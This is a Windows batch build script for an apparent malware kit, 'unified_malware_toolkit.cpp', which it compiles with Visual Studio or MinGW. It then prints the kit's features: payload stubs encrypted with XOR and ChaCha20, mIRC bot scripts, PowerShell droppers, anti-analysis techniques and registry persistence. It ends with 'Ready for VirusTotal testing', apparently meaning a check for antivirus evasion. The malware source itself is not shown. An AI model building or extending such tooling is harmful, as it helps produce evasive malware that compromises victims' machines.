@echo off
echo ========================================
echo  Unified Malware Toolkit Builder
echo ========================================

REM Check for Visual Studio
where cl.exe >nul 2>nul
if errorlevel 1 (
    echo ERROR: Visual Studio compiler not found!
    echo Please install Visual Studio or run from Developer Command Prompt
    goto TryMinGW
)

echo Compiling with Visual Studio...
cl.exe /Fe:unified_malware_toolkit.exe unified_malware_toolkit.cpp wininet.lib /link /SUBSYSTEM:CONSOLE
if errorlevel 1 (
    echo ERROR: Compilation failed with Visual Studio!
    goto TryMinGW
)
goto Success

:TryMinGW
echo Trying MinGW-w64...
where g++.exe >nul 2>nul
if errorlevel 1 (
    echo ERROR: No suitable compiler found!
    echo Please install Visual Studio or MinGW-w64
    pause
    exit /b 1
)

echo Compiling with MinGW...
g++ -o unified_malware_toolkit.exe unified_malware_toolkit.cpp -lwininet -static-libgcc -static-libstdc++ -std=c++11
if errorlevel 1 (
    echo ERROR: Compilation failed with MinGW!
    pause
    exit /b 1
)

:Success
echo.
echo ========================================
echo  BUILD SUCCESSFUL!
echo ========================================
echo Output: unified_malware_toolkit.exe
echo Size: 
dir unified_malware_toolkit.exe | find ".exe"
echo.
echo FEATURES:
echo   ^> Multi-format stub generation
echo   ^> XOR and ChaCha20 encryption  
echo   ^> MIRC bot script generation
echo   ^> PowerShell dropper creation
echo   ^> Advanced anti-analysis techniques
echo   ^> Registry persistence mechanisms
echo   ^> Network connectivity checks
echo.
echo USAGE:
echo   unified_malware_toolkit.exe                    ^(test payload^)
echo   unified_malware_toolkit.exe payload.bin       ^(custom payload^)
echo.
echo This will generate multiple stub formats ready for compilation!
echo Ready for VirusTotal testing!
echo ========================================

pause